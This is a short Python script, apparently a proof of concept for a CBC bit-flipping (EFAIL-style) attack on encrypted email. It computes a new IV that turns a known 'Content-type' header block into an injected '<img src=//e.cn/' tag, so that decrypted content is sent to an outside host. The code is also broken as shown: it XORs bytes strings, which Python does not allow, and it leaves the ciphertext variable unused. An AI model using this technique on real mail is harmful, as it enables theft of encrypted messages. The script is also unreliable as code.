import binascii

def main():
    C0 = 0x4ca5de51dea18d73bcb557cf189e120d
    IV = 0x70ccb336fed2ff10819a78aa36fd7c22
    P0 = binascii.hexlify(b'Content-type: mu')
    Malicious = binascii.hexlify(b'<img src=//e.cn/')


    C0dec = P0 ^ IV
    newIV = C0dec ^ Malicious
    print(newIV)

if __name__== "__main__":
  main()